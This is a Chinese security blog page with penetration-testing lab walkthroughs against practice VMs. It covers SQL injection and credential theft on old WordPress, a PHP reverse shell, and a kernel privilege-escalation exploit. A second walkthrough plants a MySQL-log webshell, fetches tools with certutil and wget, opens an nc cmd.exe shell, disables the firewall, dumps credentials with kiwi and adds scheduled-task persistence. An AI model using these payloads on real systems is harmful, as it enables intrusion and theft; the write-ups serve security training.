<p>②Web渗透：发现cms是WordPress 1.5.1.1，searchsploit发现可能存在SQL注入漏洞。在超链接Uncategorized的url下可以看到参数cat，尝试添加单引号’发现报错并回显了SQL查询语句，找到了SQL注入的位置。</p>
<p>③手工进行SQL注入，通过order by确定列数，再通过联合查询执行我们想要的代码。Google搜索WordPress的数据库结构，构造我们的查询语句。</p>
<p>④文件上传：拿到凭据后，登录WordPress后台，设置允许上传php文件，并上传反弹shell的php代码，得到了文件上传的路径。开启nc监听后，访问shell.php路径，触发了代码执行，拿到了初始Shell。</p>
<p>内核提权：由于内核版本老旧，寻找内核提权的exp，成功提权。</p>
<p><strong>防御方法</strong>：</p>
<p>-防御SQL注入，采取以下措施：</p>
<p>1.输入过滤：对用户输入的数据进行过滤和验证，确保其中不包含任何恶意的SQL查询语句。</p>
<p>2.参数化查询：使用参数化查询或预编译语句来减少SQL注入攻击的风险。</p>
<p>-防御文件上传漏洞，采取以下措施：</p>
<p>1.文件类型检查：对用户上传的文件进行类型检查，只接受可信的文件类型。</p>
<p>2.文件内容验证：在上传文件后，对文件内容进行检查，确认其是否符合预期的格式和结构。</p>
<p>3.文件名处理：对用户上传的文件名进行检查和处理，避免文件名中包含特殊字符或路径遍历漏洞。</p>
<p>4.文件存储位置：将上传的文件存储在非web根目录下。</p>
<p>5.文件大小限制：限制上传文件的大小，避免上传过大的文件导致服务器资源耗尽。</p>
<p>6.输入过滤和验证：对用户上传的文件名和其他相关字段进行输入过滤和验证，确保其中不包含恶意代码。</p>
<p>7.权限控制：为不同用户分配不同的上传权限，并根据需要对上传文件进行审核或审查。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/" class="post-title-link" itemprop="url">Hackdamic</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-02 13:20:51" itemprop="dateCreated datePublished" datetime="2023-11-02T13:20:51+08:00">2023-11-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:16:16" itemprop="dateModified" datetime="2024-03-12T09:16:16+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Hackdamic靶机"><a href="#Hackdamic靶机" class="headerlink" title="Hackdamic靶机"></a><strong>Hackdamic靶机</strong></h3><p>扫描虚拟机</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87157.png" class title="This is an test image">  

<p>编辑虚拟机设置</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87158.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87159.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87160.png" class title="This is an test image">  

<p><strong>信息收集</strong></p>
<p>Nmap扫描</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87161.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87162.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87163.png" class title="This is an test image">  



<p>可以看到开放的端口和对应的服务</p>
<table>
<thead>
<tr>
<th>Port</th>
<th>service</th>
</tr>
</thead>
<tbody><tr>
<td>22&#x2F;tcp</td>
<td>ssh</td>
</tr>
<tr>
<td>80&#x2F;tcp</td>
<td>web</td>
</tr>
</tbody></table>
<p>Attempt to access port 80</p>
<p>scan information on web page</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87164.png" class title="This is an test image">  

<p>Plug-in viewing framework</p>
<p><a target="_blank" rel="noopener" href="http://192.168.182.131/Hackademic_RTB1/?p=%E2%80%99%E2%80%A6%E2%80%99">http://192.168.182.131/Hackademic_RTB1/?p=’…’</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.31.162/Hackademic_RTB1/?cat=1">http://192.168.182.131/Hackademic_RTB1&#x2F;?cat&#x3D;1</a></p>
<p><strong>反弹shell</strong></p>
<p>使用dirsearch scan</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87165.png" class title="This is an test image">  

<p>没有结果，换一个路径</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87166.png" class title="This is an test image">  

<p>找到后台</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87167.png" class title="This is an test image">  

<p>有两种方法：1. sql注入</p>
<p>​                       2. 弱密码爆破</p>
<p>查看网页源代码看看有没有cms的信息</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87168.png" class title="This is an test image">  

<p>我们直接看到这个cms是WordPress的1.5.1.1版本。然后可以searchsploit一下有啥漏洞：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87169.png" class title="This is an test image">  

<p>重点观察版本匹配的开头两个，说存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>，因此接下来的渗透重点关注SQL注入</p>
<p>尝试SQL注入吧，在参数最后加一个引号，把参数改为cat&#x3D;1’</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87170.png" class title="This is an test image">  

<p> 报错了，而且回显了数据库查询语句：SELECT * FROM wp_categories WHERE cat_ID &#x3D; 1\&#39; LIMIT 1</p>
<p>先尝试获取数据库到底有多少列，通过order by [num]的方法（按照第[num]列排序），只要页面没有出现报错，就说明数据库至少有[num]列。order by 5是的界面如下</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87171.png" class title="This is an test image">  

<p> order by 6时出现了报错，说明数据库中一共有5列数据：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87172.png" class title="This is an test image">   

<p>接下来用联合查询的方法进行注入，思考SQL查询语句，要保证后台执行我们的联合查询union select语句，只要将cat_ID的值设置为0，这样就无法查询到结果，相当于只执行了union select的语句。如果将url中的参数改为cat&#x3D;0 union select 1,2,3,4,5那么SQL查询语句将会是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM wp_categories WHERE cat_ID = 0 union select 1,2,3,4,5 LIMIT 1</span><br></pre></td></tr></table></figure>

<p>LIMIT 1限制了只会显示一条结果，由于SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0无法查询到结果，因此相当于只执行了select 1,2,3,4,5 LIMIT 1，界面如下：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87173.png" class title="This is an test image">   

<p> 此处非常关键，注意上图中引号内的内容变为了2，因此select 1,2,3,4,5这个语句中2的位置可以进行查询，并回显到前端，我们可以把2修改为version()以查询MySQL的版本，这样参数修改为cat &#x3D; 0 union select 1,version(),3,4,5结果如下：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87174.png" class title="This is an test image">   

<p>回显了版本</p>
<p>由于WordPress是非常著名的cms，他的配置是固定的，可以Google查到WordPress1.5.1.1对应的数据库结构</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87175.png" class title="This is an test image">   

<p>找到了wordpress 1.5.1版本下存在的表的结构，有一个名为wp_users的表，下面有user_login,user_pass,user_level（用户名，密码，权限）等关心的列</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87176.png" class title="This is an test image">   

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,user_login,user_pass,user_level from wp-users</span><br></pre></td></tr></table></figure>

<p>比如可以查询user_login试试cat&#x3D;0 union select 1,user_login,3,4,5 from wp_users</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87177.png" class title="This is an test image">   

<p>成功查到了一天账号GeorgeMiller，但受限于LIMIT 1,我们只看到了这一个用户，此时可以用group_concat函数让一行内显示所有信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat=0 union select 1,group_concat(user_login),3,4,5 from wp_users</span><br></pre></td></tr></table></figure>

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87178.png" class title="This is an test image">   

<p>把id，user_login，user_pass ，user_level这几个都注入出来</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87179.png" class title="This is an test image">   

<p>可以找到权限级别user_level最高的用户是GeorgeMiller，他的user_level是10，然后我们破解他的密码哈希7cbb3252ba6b7e9c422fac5334d22054</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87180.png" class title="This is an test image">   

<p>很容易得到是md5，然后找个在线网站Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online破解即可：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87181.png" class title="This is an test image">    

<p>密码是q1w2e3</p>
<p>下面通过用户名GeorgeMiller，密码q1w2e3登录WordPress后台</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87182.png" class title="This is an test image">    

<p>设置允许php文件上传</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87183.png" class title="This is an test image">    

<p>设置成功后，我们可以发现菜单中出现了Upload界面，我们可以上传一个反弹shell的php文件，即shell.php，代码如下，其中10.10.10.128是kali的ip，1234是一会接收shell的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.128/1234 0&gt;&amp;1&#x27;&quot;); ?&gt; </span><br></pre></td></tr></table></figure>

<p>上传成功且路径是&#x2F;wp-content&#x2F;，下面只要开启nc监听，并访问&#x2F;wp-content&#x2F;shell.php即可接收到反弹shell</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87184.png" class title="This is an test image">    

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87185.png" class title="This is an test image">    

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87186.png" class title="This is an test image">    nc监听成功收到了反弹shell



<p><strong>最后进行内核提权</strong></p>
<p>先用python增强shell的交互性：</p>
<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
<p>查看当前用户，是apache，然后查看内核版本，是2.6.31</p>
<p>用sudo -l查看当前用户权限：需要密码。此路不通</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87187.png" class title="This is an test image">    

<p> 由于22端口的SSH服务没有开放，所以对于提权来说，寻找SSH登录密码是没有意义的，而我们看到的内核版本又比较老旧，因此可采用内核提权的方法。在searchsploit中搜索Linux kernel 2.6.3版本的提权漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel 2.6.3 | grep -i &#x27;Privilege Escalation&#x27; </span><br></pre></td></tr></table></figure>

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87188.png" class title="This is an test image">    

<p>尝试15258.c，发现可以提权，过程如下，先把漏洞利用文件下载下来</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87189.png" class title="This is an test image">    

<p>然后把他传到靶机的&#x2F;tmp目录下，先在kali中启动一个http服务：</p>
<p>php -S 0:80</p>
<p>然后在靶机&#x2F;tmp目录下wget，把kali中的15285.c下载下来：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87190.png" class title="This is an test image">    

<p>在靶机中用gcc编译，就直接命名为15285得了</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87191.png" class title="This is an test image">    

<p> 然后直接运行即可提权</p>
<p>进入&#x2F;root目录，查看key.txt</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87192.png" class title="This is an test image">    

<p>成功拿到flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" class="post-title-link" itemprop="url">红日靶场</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-26 09:04:58" itemprop="dateCreated datePublished" datetime="2023-10-26T09:04:58+08:00">2023-10-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-11 23:34:44" itemprop="dateModified" datetime="2024-03-11T23:34:44+08:00">2024-03-11</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h3><p><strong>编辑虚拟网络</strong></p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8790.png" class title="This is an test image"> 

<p>kali</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8791.png" class title="This is an test image">  

<p>Win 7</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8792.png" class title="This is an test image">  

<p>Win2K3&#x2F;2008 R2</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8793.png" class title="This is an test image">  

<p>查看本机ip</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8794.png" class title="This is an test image">  

<p>开靶机和未开靶机对比，得知目标主机IP为192.168.229.129</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8795.png" class title="This is an test image">  

<p>启动Win7中的Web服务</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8796.png" class title="This is an test image">  

<p>nmap扫描一下目标主机，发现开放了80, 3306端口</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8797.png" class title="This is an test image">  

<p>对目标进行访问，发现默认页面为phpStudy 探针,泄露大量信息。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8798.png" class title="This is an test image">  

<p>目录扫描，发现后台登录界面的网址</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8799.png" class title="This is an test image">  

<p>尝试访问</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87100.png" class title="This is an test image">  

<p> 抓包发现没有进行防爆破，尝试进行爆破</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87101.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87102.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87103.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87104.png" class title="This is an test image">   

<p>账密为root&#x2F;root,进入后台</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87105.png" class title="This is an test image">   

<p>将变量中的general log更改为ON，将general log file的路径更改为当前网站根目录下路径C:\phpStudy\WWW\test.php。（开启 SQL 的通用查询日志功能，并将日志文件保存在该路径）<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87106.png" class title="This is an test image">  </p>
<p>在SQL界面写入一句话木马</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87107.png" class title="This is an test image">   

<p>访问<a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=phpinfo();%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E6%8F%92%E5%85%A5">http://192.168.229.129/test.php?test=phpinfo();验证成功插入</a></p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87108.png" class title="This is an test image">  

<p>将nc和wget.exe放入&#x2F;var&#x2F;www&#x2F;html目录下，然后启动Apache服务。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87109.png" class title="This is an test image">  

<p>查看服务的状态</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87110.png" class title="This is an test image">  

<p>服务已正常启动，访问127.0.0.1看到默认页面</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87111.png" class title="This is an test image">    

<p>WEBSHELL中执行，完整命令为<a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.229.128/wget.exe">http://192.168.229.128/wget.exe</a> C:\phpStudy\WWW\wget.exe”);</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87112.png" class title="This is an test image">   

<p>通过Windows下的dir命令查看,<a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=system(%22dir%22)">http://192.168.229.129/test.php?test=system(&quot;dir&quot;)</a>;</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87113.png" class title="This is an test image">   

<p>之后使用wget将整个nc的文件夹下载下来。WEBSHELL中执行wget -r -np -nH –cut-dirs&#x3D;1 <a target="_blank" rel="noopener" href="http://192.168.100.128/nc/">http://192.168.100.128/nc/</a></p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87114.png" class title="This is an test image">   

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87115.png" class title="This is an test image">   

<p>之后在kali上进行监听，再让Win7连接kali。靶机的WEBSHELL中执行nc 192.168.229.128 8888 -e cmd.exe</p>
<p><a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“nc 192.168.229.128 8888 -e cmd.exe”);</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87116.png" class title="This is an test image">   

<p>攻击机执行nc -vlp 8888</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87117.png" class title="This is an test image">   



<p><strong>权限维持与内网信息收集</strong></p>
<p>首先修改cmd的字符编码为utf-8（chcp 65001），以此来避免乱码问题</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87118.png" class title="This is an test image">   

<p><strong>获取系统信息</strong></p>
<p>有用信息：1. 主机加了一个域god.org</p>
<p>​                   2. 此主机的网络配置，内网网段包含192.168.52.143</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87119.png" class title="This is an test image">   

<p>Whoami得知我们现在的用户为administrator，属于god域</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87120.png" class title="This is an test image">   

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87121.png" class title="This is an test image">   

<p><strong>关闭windows防火墙</strong></p>
<p>（”netsh” 是一个用于配置和监控各种网络设置的命令行工具。”advfirewall” 是 Windows Firewall（也称为Windows防火墙）的管理组件。”set currentprofile” 表示该命令将应用于当前活动的配置文件，即当前正在使用的防火墙配置文件。”state off” 意味着将关闭当前活动的防火墙配置文件。）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87122.png" class title="This is an test image">   



<p><strong>修改注册表以允许远程桌面连接</strong></p>
<p>HKEY_LOCAL_MACHINE” 分支下的 “SYSTEM\CurrentControlSet\Control\Terminal Server:修改的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/v fDenyTSConnections：修改的键值名称 fDenyTSConnections 是表示是否允许远程桌面连接的</span><br><span class="line">/t REG_DWORD：设定数据类型</span><br><span class="line">/d 0：设置数据</span><br><span class="line">/f：强制操作</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87123.png" class title="This is an test image">   

<p>启动远程桌面服务</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87124.png" class title="This is an test image">   

<p>进行远程桌面连接</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87125.png" class title="This is an test image">   

<p>创建一个msf的木马，将这个木马移动到&#x2F;var&#x2F;www&#x2F;html文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-p    指定payload</span><br><span class="line">LHOST  攻击机IP</span><br><span class="line">LPORT  监听端口</span><br><span class="line">-f    确定输出格式</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87126.png" class title="This is an test image">   

<p>让目标下载这个木马</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87127.png" class title="This is an test image">  

<p> 进入msf框架的命令行</p>
<p>use exploit&#x2F;multi&#x2F;handler使用“多模块”漏洞利用程序</p>
<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp设置要使用的负载类型，指定了Windows 64位操作系统上的Meterpreter负载</p>
<p>set lhost设置攻击机器的IP地址</p>
<p>set lport设置监听端口号</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87128.png" class title="This is an test image">  

<p>运行木马</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87129.png" class title="This is an test image">  

<p>成功返回结果</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87130.png" class title="This is an test image">  

<p>getsystem进一步提权，getuid查看提权结果</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87131.png" class title="This is an test image">  

<p>导入kiwi模块，获取到系统中的用户名和密码</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87132.png" class title="This is an test image">  

<p>creds_all获取目标系统上存储的凭据信息</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87133.png" class title="This is an test image">  

<p> 设置一个定时任务，以免连接被断开。（taskschd.msc打开任务计划程序）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87134.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87135.png" class title="This is an test image">  

<p> 创建完成，重启win7进行验证</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87136.png" class title="This is an test image">  

<p>在攻击机上监听</p>
